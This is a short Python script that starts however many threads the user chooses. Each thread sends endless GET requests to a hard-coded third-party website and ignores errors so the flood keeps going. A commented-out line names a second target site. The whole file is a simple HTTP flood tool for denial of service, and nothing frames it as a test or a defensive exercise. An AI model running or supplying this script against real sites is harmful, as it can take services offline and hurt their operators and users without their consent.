import requests
import threading

n = 0
def send():
    global n
    n+=1
    print(n)
    while True:
        try:
            r = requests.get("https://padmazon.com.bd/", timeout=2)
        except KeyboardInterrupt as e:
            break
        except Exception as e:
            pass
    # r = requests.get("https://smsbotsk.com/")

thread = int(input("thread:\n"))
threads = []
for _ in range(thread):
    t = threading.Thread(target=send)
    t.start()
    threads.append(t)

for item in threads:
    item.join()